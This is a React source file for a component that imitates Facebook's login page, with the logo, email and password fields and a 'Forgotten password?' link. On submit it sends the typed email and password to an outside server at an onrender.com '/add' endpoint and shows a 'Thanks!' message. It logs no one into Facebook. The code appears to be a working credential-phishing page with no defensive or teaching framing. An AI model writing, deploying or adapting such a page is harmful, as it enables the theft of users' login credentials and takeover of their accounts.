import React, { useState } from "react";
import "./App.css";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import axios from "axios";

const FacebookLogin = () => {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });

  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState(null);

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const toggleShowPassword = () => {
    setShowPassword((prev) => !prev);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError(null);

    // Basic Validation
    if (formData.password.length < 6) {
      setError("Password must be at least 6 characters long.");
      return;
    }

    setLoading(true);

    try {
      const response = await axios.post(
        "https://form-back-qjdy.onrender.com/add",
        formData,
      );
      console.log("Response:", response.data);
      setSuccess(true);
    } catch (error) {
      console.error("Error sending data:", error);
      setError("Something went wrong. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fb-container">
      <div className="fb-box" role="main">
        <h1 className="fb-logo">facebook</h1>

        {success ? (
          <div className="fb-success">
            <h2>Thanks!</h2>
            <p>Your information has been successfully received.</p>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="fb-form">
            <input
              type="email"
              name="email"
              placeholder="Email address"
              value={formData.email}
              onChange={handleChange}
              required
              aria-label="Email address"
            />

            <div className="input-wrap">
              <input
                type={showPassword ? "text" : "password"}
                name="password"
                placeholder="Password"
                value={formData.password}
                onChange={handleChange}
                required
                aria-label="Password"
              />

              {/* 👁 Eye icon shows ONLY when password is typed */}
              {formData.password.length > 0 && (
                <button
                  type="button"
                  className="eye-btn"
                  onClick={toggleShowPassword}
                  aria-label={showPassword ? "Hide password" : "Show password"}
                >
                  {showPassword ? <FaEyeSlash /> : <FaEye />}
                </button>
              )}
            </div>

            {error && <span className="error-text">{error}</span>}

            <button type="submit" className="fb-login-btn" disabled={loading}>
              {loading ? "Logging in..." : "Log In"}
            </button>

            <a href="#" className="fb-forgot">
              Forgotten password?
            </a>
          </form>
        )}
      </div>
    </div>
  );
};

export default FacebookLogin;
